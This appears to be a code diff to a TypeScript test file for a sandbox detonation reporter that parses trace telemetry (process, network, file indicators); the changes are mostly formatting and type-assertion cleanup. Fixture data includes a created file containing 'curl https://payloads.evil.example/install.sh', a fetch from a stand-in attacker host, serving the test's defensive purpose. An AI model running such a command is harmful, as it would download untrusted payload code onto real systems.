@@ -61,7 +61,8 @@ test("buildDetonationReportFromPromptRunner captures trace telemetry and persist
           currentHash: "sha256:after",
           baselineContent: "# MEMORY\nbefore\n",
           currentContent: "# MEMORY\nafter\n",
-          diffText: "--- memory.before\n+++ memory.after\n@@\n-# MEMORY\n-before\n+# MEMORY\n+after",
+          diffText:
+            "--- memory.before\n+++ memory.after\n@@\n-# MEMORY\n-before\n+# MEMORY\n+after",
         },
         {
           name: "soul",
@@ -88,7 +89,8 @@ test("buildDetonationReportFromPromptRunner captures trace telemetry and persist
           kind: "created",
           currentHash: "sha256:payload",
           currentContent: "curl https://payloads.evil.example/install.sh",
-          diffText: "--- install.before\n+++ install.after\n@@\n+curl https://payloads.evil.example/install.sh",
+          diffText:
+            "--- install.before\n+++ install.after\n@@\n+curl https://payloads.evil.example/install.sh",
         },
       ],
       stepTraces: [
@@ -120,7 +122,7 @@ test("buildDetonationReportFromPromptRunner captures trace telemetry and persist
 
     const telemetryArtifact = built.artifacts.find((artifact) => artifact.type === "report-json");
     assert.ok(telemetryArtifact);
-    const telemetryJson = await readFile(telemetryArtifact!.path, "utf8");
+    const telemetryJson = await readFile(telemetryArtifact.path, "utf8");
     assert.match(telemetryJson, /93\.184\.216\.34/u);
     assert.match(telemetryJson, /sha256:payload/u);
   } finally {
@@ -213,10 +215,22 @@ test("enrichDetonationTelemetryIndicators dedupes and routes file, url, domain, 
     },
   );
 
-  assert.equal(verdicts.some((verdict) => verdict.subjectType === "file"), true);
-  assert.equal(verdicts.some((verdict) => verdict.subjectType === "url"), true);
-  assert.equal(verdicts.some((verdict) => verdict.subjectType === "domain"), true);
-  assert.equal(verdicts.some((verdict) => verdict.subjectType === "ip"), true);
+  assert.equal(
+    verdicts.some((verdict) => verdict.subjectType === "file"),
+    true,
+  );
+  assert.equal(
+    verdicts.some((verdict) => verdict.subjectType === "url"),
+    true,
+  );
+  assert.equal(
+    verdicts.some((verdict) => verdict.subjectType === "domain"),
+    true,
+  );
+  assert.equal(
+    verdicts.some((verdict) => verdict.subjectType === "ip"),
+    true,
+  );
 });
 
 function makeMinimalResult(stepId: string, traceContent: string): PromptRunnerResult {
@@ -271,7 +285,7 @@ test("buildDetonationReportFromPromptRunner deduplicates argv[0] in process even
   const processEvent = built.telemetry.find((e) => e.type === "process" && e.process);
   assert.ok(processEvent, "expected a process event");
   assert.equal(
-    processEvent!.detail,
+    processEvent.detail,
     "Executed /usr/bin/curl https://example.com/file",
     "command path and argv[0] should not both appear",
   );
@@ -289,8 +303,14 @@ test("buildDetonationReportFromPromptRunner suppresses execution-record process 
 
   const built = await buildDetonationReportFromPromptRunner(result);
   const processEvents = built.telemetry.filter((e) => e.type === "process");
-  assert.equal(processEvents.length, 1, "only one process event expected (from trace, not harness)");
-  assert.equal(processEvents[0]!.process!.command, "/usr/bin/curl");
+  const [processEvent] = processEvents;
+  assert.equal(
+    processEvents.length,
+    1,
+    "only one process event expected (from trace, not harness)",
+  );
+  assert.ok(processEvent?.process);
+  assert.equal(processEvent.process.command, "/usr/bin/curl");
   assert.ok(
     !built.report.triggeredActions.some((a) => a.includes("node harness")),
     "harness command should not appear in triggeredActions",
@@ -306,8 +326,9 @@ test("buildDetonationReportFromPromptRunner parses connect with trailing strace 
   const built = await buildDetonationReportFromPromptRunner(result);
   const networkEvent = built.telemetry.find((e) => e.type === "network");
   assert.ok(networkEvent, "expected a network event even with trailing timing annotation");
-  assert.equal(networkEvent!.network!.address, "93.184.216.34");
-  assert.equal(networkEvent!.network!.port, 443);
+  assert.ok(networkEvent.network);
+  assert.equal(networkEvent.network.address, "93.184.216.34");
+  assert.equal(networkEvent.network.port, 443);
 });
 
 test("buildDetonationReportFromPromptRunner detects UDP protocol from fd annotation", async () => {
@@ -319,9 +340,10 @@ test("buildDetonationReportFromPromptRunner detects UDP protocol from fd annotat
   const built = await buildDetonationReportFromPromptRunner(result);
   const networkEvent = built.telemetry.find((e) => e.type === "network");
   assert.ok(networkEvent, "expected a network event");
-  assert.equal(networkEvent!.network!.protocol, "udp");
-  assert.equal(networkEvent!.network!.address, "8.8.8.8");
-  assert.equal(networkEvent!.network!.port, 53);
+  assert.ok(networkEvent.network);
+  assert.equal(networkEvent.network.protocol, "udp");
+  assert.equal(networkEvent.network.address, "8.8.8.8");
+  assert.equal(networkEvent.network.port, 53);
 });
 
 test("buildDetonationReportFromPromptRunner decodes hex and octal escape sequences in execve args", async () => {
@@ -333,7 +355,8 @@ test("buildDetonationReportFromPromptRunner decodes hex and octal escape sequenc
   const built = await buildDetonationReportFromPromptRunner(result);
   const processEvent = built.telemetry.find((e) => e.type === "process" && e.process);
   assert.ok(processEvent, "expected a process event");
-  const secondArg = processEvent!.process!.args[1];
+  assert.ok(processEvent.process);
+  const secondArg = processEvent.process.args[1];
   assert.ok(secondArg?.includes("\x1b[31m"), "hex escape \\x1b should be decoded");
   assert.ok(secondArg?.includes("\r\n"), "\\r and \\n should be decoded");
 });
